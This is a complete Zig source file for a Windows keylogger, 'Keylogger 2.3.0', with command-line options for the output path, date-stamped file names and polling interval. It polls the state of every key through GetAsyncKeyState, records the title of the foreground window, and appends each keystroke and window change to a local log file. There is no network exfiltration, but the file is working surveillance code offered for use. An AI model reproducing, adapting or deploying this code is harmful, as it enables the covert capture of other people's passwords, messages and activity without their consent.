const VERSION = "2.3.0";
const std = @import("std");
const Clock = std.Io.Clock;
const Duration = std.Io.Duration;
const File = std.Io.File;
const Writer = std.Io.Writer;
const Allocator = std.mem.Allocator;
const ArrayList = std.ArrayList;
const timestamp = std.Io.Timestamp.now;
const cwd = std.Io.Dir.cwd;
const eql = std.mem.eql;
const print = std.debug.print;
const f = std.fmt.bufPrint;
const cTime = @cImport(@cInclude("time.h"));
const parseInt = std.fmt.parseInt;

const win = std.os.windows;
extern "user32" fn GetForegroundWindow() callconv(.winapi) ?win.HWND;
extern "user32" fn GetAsyncKeyState(vKey: i32) callconv(.winapi) i16;
extern "user32" fn GetWindowTextA(hwnd: win.HWND, lpString: [*]u8, nMaxCount: i32) callconv(.winapi) i32;

const PrevType = enum {
    init,
    window,
    key,
};

pub fn main(init: std.process.Init) !void {
    const minimal = init.minimal;
    const allocator = init.arena.allocator();
    const io = init.io;

    const stdout_buffer = try allocator.alloc(u8, 1024);
    defer allocator.free(stdout_buffer);
    var stdout_writer = File.stdout().writer(io, stdout_buffer);
    const stdout = &stdout_writer.interface;

    var args_iter = try minimal.args.iterateAllocator(allocator);
    defer args_iter.deinit();
    _ = args_iter.next();

    var arg_output_format1 = try ArrayList(u8).initCapacity(allocator, 1024);
    defer arg_output_format1.deinit(allocator);

    var arg_verbose: u8 = 0;
    var arg_use_date = false;
    var arg_sleep: i64 = 10;
    while (args_iter.next()) |arg| {
        if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
            try printHeader(stdout);
            try printHelp(stdout);
            return;
        } else if (eql(u8, arg, "-v") or eql(u8, arg, "--verbose")) {
            arg_verbose = 1;
        } else if (eql(u8, arg, "-vv")) {
            arg_verbose = 2;
        } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
            if (args_iter.next()) |next_arg| {
                arg_output_format1.clearRetainingCapacity();
                try arg_output_format1.appendSlice(allocator, next_arg);
            }
        } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
            arg_use_date = true;
        } else if (eql(u8, arg, "-s") or eql(u8, arg, "--sleep")) {
            if (args_iter.next()) |next_arg| {
                arg_sleep = try parseInt(i64, next_arg, 10);
                if (arg_sleep < 10) {
                    arg_sleep = 10;
                }
            }
        }
    }

    if (arg_output_format1.items.len == 0) {
        if (arg_use_date) {
            try arg_output_format1.appendSlice(allocator, "keylogger_%Y%m%d_%H%M%S.log");
        } else {
            try arg_output_format1.appendSlice(allocator, "keylogger.log");
        }
    }

    var arg_output_path_b = try allocator.alloc(u8, 1024);
    defer allocator.free(arg_output_path_b);

    var arg_output_format2 = try allocator.allocSentinel(u8, 1024, 0);
    defer allocator.free(arg_output_format2);
    const len = @min(arg_output_format1.items.len, arg_output_path_b.len - 1);
    @memcpy(arg_output_format2[0..len], arg_output_format1.items[0..len]);
    arg_output_format2[len] = 0;

    const now = Clock.real.now(io).toSeconds();
    const localtime = cTime.localtime(&now);
    const output_path_l = cTime.strftime(arg_output_path_b.ptr, 1024, arg_output_format2, localtime);
    const arg_output_path_s = arg_output_path_b[0..output_path_l];

    if (arg_verbose >= 1) {
        try printHeader(stdout);
        try stdout.print("output format: '{s}'\n", .{arg_output_format1.items});
        try stdout.print("output path:   '{s}'\n", .{arg_output_path_s});
        try stdout.print("sleep: {d}\n", .{arg_sleep});
        try stdout.flush();
    }

    var file = try cwd().createFile(io, arg_output_path_s, .{
        .truncate = false,
        .read = true,
    });
    defer file.close(io); // Actually never reached because of while(true) later below.

    const writer_buf = try allocator.alloc(u8, 1024);
    defer allocator.free(writer_buf);
    var file_writer = file.writer(io, writer_buf);
    const io_writer = &file_writer.interface;

    // Append to end.
    const stat = try file.stat(io);
    const file_exists = stat.size > 0;
    try file_writer.seekTo(stat.size);

    if (arg_verbose >= 1) {
        try stdout.print("output file size: {d}\n", .{stat.size});
        try stdout.print("output file exists: {any}\n", .{file_exists});
        try stdout.flush();
    }

    const title_len: usize = 1024;
    const title_len_i: c_uint = @intCast(title_len - 1);
    const ctitle_b = try allocator.alloc(u8, title_len);
    const ptitle_b = try allocator.alloc(u8, title_len);

    const key_len: usize = 255;
    const key_name_b = try allocator.alloc(u8, key_len);

    for (0..title_len) |n| {
        ctitle_b[n] = 0;
        ptitle_b[n] = 0;
    }
    for (0..key_len) |n| key_name_b[n] = 0;

    var prev_type: PrevType = .init;
    while (true) {
        try io.sleep(.fromMilliseconds(arg_sleep), .real);

        const hwnd: win.HWND = GetForegroundWindow() orelse continue;
        const ctitle_len = GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
        const ctitle_len_u: usize = @intCast(ctitle_len);
        const ctitle_s: []u8 = ctitle_b[0..ctitle_len_u];

        if (!eql(u8, ptitle_b, ctitle_b)) {
            if (arg_verbose >= 1) {
                try stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
                try stdout.flush();
            }
            switch (prev_type) {
                .init => {
                    if (file_exists) {
                        try io_writer.writeAll("\n");
                    }
                },
                .window => {},
                .key => try io_writer.writeAll("\n"),
            }
            try io_writer.writeAll("window: '");
            try io_writer.writeAll(ctitle_s);
            try io_writer.writeAll("'\n");
            try io_writer.flush();
            @memcpy(ptitle_b, ctitle_b);
            prev_type = .window;
        }

        var key_i: u8 = 1;
        while (key_i < 255) : (key_i += 1) {
            const key_state: win.SHORT = GetAsyncKeyState(key_i);
            if (key_state & 1 != 0) {
                const key_name_s = getKeyName(key_name_b, key_i);
                if (arg_verbose >= 1) {
                    try stdout.print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
                    try stdout.flush();
                }
                try io_writer.writeAll(key_name_s);
                try io_writer.flush();
                prev_type = .key;
            }
        }
    }
    try io_writer.flush();
    try file_writer.flush();
}

fn printHeader(stdout: *Writer) !void {
    try stdout.print("Keylogger " ++ VERSION ++ "\n", .{});
    try stdout.print("Copyright (C) 2009 Christian Mayer <https://fox21.at>\n\n", .{});
    try stdout.flush();
}

fn printHelp(stdout: *Writer) !void {
    const help =
        \\Usage: keylogger.exe [<options>]
        \\
        \\Options:
        \\-h, --help                Print this help.
        \\-v, --verbose             Verbose output.
        \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
        \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
        \\-s, --sleep <msec>        Time to sleep in milliseconds. Default: 10
    ;
    try stdout.print(help ++ "\n", .{});
    try stdout.flush();
}

fn getKeyName(kn: []u8, ki: u8) []u8 {
    const x = (switch (ki) {
        1 => f(kn, "[LMOUSE]", .{}),
        2 => f(kn, "[RMOUSE]", .{}),
        4 => f(kn, "[MMOUSE]", .{}),
        8 => f(kn, "[BACKSPACE]", .{}),
        9 => f(kn, "[TAB]", .{}),
        13 => f(kn, "[RETURN]", .{}),
        16 => f(kn, "[SHIFT]", .{}),
        17 => f(kn, "[CONTROL]", .{}),
        18 => f(kn, "[ALT]", .{}),
        19 => f(kn, "[PAUSE]", .{}),
        20 => f(kn, "[CAPS LOCK]", .{}),
        27 => f(kn, "[ESC]", .{}),
        32 => f(kn, "[SPACE]", .{}),
        33 => f(kn, "[PAGE UP]", .{}),
        34 => f(kn, "[PAGE DOWN]", .{}),
        35 => f(kn, "[END]", .{}),
        36 => f(kn, "[HOME]", .{}),
        37 => f(kn, "[ARROW LEFT]", .{}),
        38 => f(kn, "[ARROW UP]", .{}),
        39 => f(kn, "[ARROW RIGHT]", .{}),
        40 => f(kn, "[ARROW DOWN]", .{}),
        44 => f(kn, "[PRINT]", .{}),
        45 => f(kn, "[INS]", .{}),
        46 => f(kn, "[DEL]", .{}),
        65...90 => f(kn, "{c}", .{ki}),
        91, 92 => f(kn, "[WIN]", .{}),
        96...105 => f(kn, "[NUM {d}]", .{ki - 96}),
        106 => f(kn, "[NUM *]", .{}),
        107 => f(kn, "[NUM +]", .{}),
        109 => f(kn, "[NUM -]", .{}),
        110 => f(kn, "[NUM ,]", .{}),
        111 => f(kn, "[NUM /]", .{}),
        112...135 => f(kn, "[F{d}]", .{ki - 111}),
        144 => f(kn, "[NUM]", .{}),
        145 => f(kn, "[ROLL]", .{}),
        160, 161 => f(kn, "[SHIFT]", .{}),
        162, 163 => f(kn, "[STRG]", .{}),
        164 => f(kn, "[ALT]", .{}),
        165 => f(kn, "[ALT GR]", .{}),
        186 => f(kn, "[UE]", .{}), // ü
        187 => f(kn, "+", .{}),
        188 => f(kn, ",", .{}),
        189 => f(kn, "-", .{}),
        190 => f(kn, ".", .{}),
        191 => f(kn, "#", .{}),
        192 => f(kn, "[OE]", .{}), // ö
        219 => f(kn, "[SS]", .{}), // ß
        222 => f(kn, "[AE]", .{}), // ä
        226 => f(kn, "<", .{}),
        else => f(kn, "[KEY \\{d}]", .{ki}),
    }) catch @panic("bufPrint failed");
    return x;
}
